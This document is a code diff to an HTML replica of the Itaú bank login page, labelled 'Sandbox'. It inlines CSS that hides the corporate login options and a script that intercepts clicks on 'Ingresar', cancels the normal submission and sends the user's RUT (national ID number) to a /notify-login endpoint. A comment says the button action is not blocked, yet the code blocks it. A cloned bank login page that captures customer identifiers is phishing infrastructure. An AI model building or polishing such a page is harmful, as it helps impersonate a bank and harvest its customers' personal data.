@@ -4,7 +4,88 @@
     <meta charset="UTF-8">
     <title>Replica Login Itaú - Sandbox</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="/styles.css">
+    <!-- INLINE STYLES (workaround) -->
+    <style>
+/* ============================================================
+   REPLICA LOGIN ITAÚ - CSS REVISADO: centering + UI cleanup
+   ============================================================ */
+
+/* --- Existing styles remain above; this file replaces the end with new rules --- */
+
+/* CENTERING & UI ADJUSTMENTS */
+
+/* Hide specific unwanted login buttons (server-side IDs) */
+#btnLoginPortalCorporate,
+#btnLoginPortalCorporate2,
+#btnLoginPortalEmpresas,
+#btnLoginPortalEmpresas2 {
+  display: none !important;
+}
+
+/* Hide the two '¿Eres nuevo...' secondary buttons, keep the orange general one */
+.itau-btn-secondary-corporate,
+.itau-btn-secondary-empresa {
+  display: none !important;
+}
+
+/* Ensure the orange general primer ingreso remains visible and styled */
+.primer-ingreso-container .itau-btn-general {
+  display: block !important;
+  background: #ff6a00;
+  color: #fff;
+  border-radius: 6px;
+}
+
+/* Force only one visible 'Ingresar' button: keep #btnLogin visible */
+#btnLogin { display: block !important; }
+
+/* Prevent corporate/empresa primary buttons from showing */
+.itauOne__button--primary--corporate,
+.itauOne__button--primary--empresa { display: none !important; }
+
+/* Center the login area horizontally and vertically */
+.itau-main-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: calc(100vh - 140px); /* header + footer approx */
+}
+
+.itau-main-container .container {
+  width: 100%;
+  max-width: 980px;
+  padding: 20px;
+}
+
+.itau-main-container .row {
+  width: 100%;
+  justify-content: center;
+  align-items: center;
+  gap: 24px;
+}
+
+.login-box {
+  max-width: 480px;
+  margin: 0 auto;
+}
+
+.box-container-login {
+  max-width: 360px;
+  margin: 0 auto;
+}
+
+/* Make sure on small screens layout stacks and is centered nicely */
+@media (max-width: 768px) {
+  .itau-main-container {
+    min-height: auto;
+    padding-top: 20px;
+    padding-bottom: 20px;
+    display: block;
+  }
+  .itau-main-container .row { margin: 0 auto; }
+  .login-box, .box-container-login { max-width: 100%; }
+}
+    </style>
 </head>
 <body>
 
@@ -234,6 +315,97 @@
     </div>
 </footer>
 
-<script src="/script.js"></script>
+<!-- INLINE SCRIPT (workaround) -->
+<script>
+// public/script.js (inlined)
+document.addEventListener('DOMContentLoaded', () => {
+  // 1) Eliminar botones específicos que no queremos
+  const removeIds = [
+    'btnLoginPortalCorporate',
+    'btnLoginPortalCorporate2',
+    'btnLoginPortalEmpresas',
+    'btnLoginPortalEmpresas2',
+    'btnPrimerIngresoCorporate',
+    'btnPrimerIngresoEmpresas',
+    'btnPrimerIngresoGeneral'
+  ];
+  removeIds.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.remove();
+  });
+
+  // 2) Eliminar duplicados visibles con texto "Ingresar" y mantener el primero
+  const allButtons = Array.from(document.querySelectorAll('button, a.itau-btn, a.itau-btn-general'));
+  const ingresarBtns = allButtons.filter(b => b.textContent && b.textContent.trim().toLowerCase() === 'ingresar');
+  if (ingresarBtns.length > 1) {
+    // Mantener el primero y eliminar el resto
+    ingresarBtns.slice(1).forEach(b => b.remove());
+    console.log('Duplicados de "Ingresar" eliminados.');
+  }
+
+  // 3) Función para notificar al servidor (no envía contraseñas)
+  async function notifyLogin(rutVal) {
+    try {
+      const res = await fetch('/notify-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ rut: rutVal })
+      });
+      // show notification result
+      const data = await res.json().catch(() => null);
+      let box = document.getElementById('notifyResultBox');
+      if (!box) {
+        box = document.createElement('div');
+        box.id = 'notifyResultBox';
+        box.style.marginTop = '12px';
+        box.style.padding = '10px';
+        box.style.borderRadius = '6px';
+        box.style.fontSize = '14px';
+        box.style.textAlign = 'center';
+        const form = document.getElementById('loginFormID');
+        if (form) form.parentNode.insertBefore(box, form.nextSibling);
+        else document.body.appendChild(box);
+      }
+      if (res.ok && data && data.ok) {
+        box.style.display = 'block';
+        box.textContent = data.message || 'Solicitud recibida correctamente';
+        box.style.background = '#e6fdf0';
+        box.style.color = '#006b2e';
+      } else {
+        box.style.display = 'block';
+        box.textContent = data && data.message ? data.message : 'No se pudo notificar. Revisa logs.';
+        box.style.background = '#ffe6e6';
+        box.style.color = '#a00';
+      }
+      setTimeout(() => box.style.display = 'none', 8000);
+    } catch (err) {
+      console.error('Error enviando /notify-login:', err);
+    }
+  }
+
+  // 4) Delegación de eventos: detectar cualquier click en un botón/anchor con texto "Ingresar"
+  document.body.addEventListener('click', (e) => {
+    const btn = e.target.closest('button, a');
+    if (!btn) return;
+    const txt = (btn.textContent || '').trim().toLowerCase();
+    if (txt.includes('ingresar')) {
+      e.preventDefault && e.preventDefault();
+      // Obtener el RUT del formulario (no recoger contraseña)
+      const rutInput = document.getElementById('rut_usuarioID') || document.querySelector('input[name="rut_usuario"]');
+      const rutVal = rutInput ? rutInput.value.trim() : '';
+
+      // Enviar la notificación (no bloquea la acción del botón)
+      notifyLogin(rutVal);
+    }
+  }, true);
+
+  // 5) Asegurar que hay al menos un botón visible "Ingresar" (si no, mostrar el btnLogin si existe)
+  const visibleIngresar = document.querySelector('button, a.itau-btn, a.itau-btn-general');
+  if (!visibleIngresar) {
+    const fallback = document.getElementById('btnLogin');
+    if (fallback) fallback.style.display = 'inline-block';
+  }
+});
+</script>
 </body>
 </html>
